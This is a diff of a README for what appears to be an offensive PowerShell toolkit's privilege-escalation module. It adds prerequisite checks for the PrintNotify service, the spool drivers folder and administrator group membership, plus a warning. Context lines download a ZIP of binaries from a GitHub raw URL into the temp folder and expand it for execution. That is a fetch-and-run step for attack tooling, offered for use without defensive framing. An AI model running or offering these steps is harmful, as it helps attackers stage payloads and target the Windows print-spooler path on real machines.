@@ -29,6 +29,20 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/LPE/Pr
 
 <br />
 
+<b><i>pre-requesites checks:</i></b>
+```powershell
+#Make sure PrintNotify service exists
+[bool](get-service -name "PrintNotify")
+
+#Make sure System32\spool\drivers\x64\3 exists
+[bool](Test-Path -Path "$Env:WINDIR\System32\spool\drivers\x64\3\")
+
+#Make sure we have administrator privileges in shell
+[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
+```
+
+<br />
+
 **downloadcmdLet:**
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/LPE/bin.zip" -OutFile "$Env:TMP\bin.zip"
@@ -37,6 +51,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/LPE/bi
 <br />
 
 **execute:**
+> **Warning**: Administrator privileges required to perform actions.
 ```powershell
 # Expand ZIP archive
 Expand-Archive -Path "$Env:TMP\bin.Zip" -DestinationPath "$Env:TMP" -force
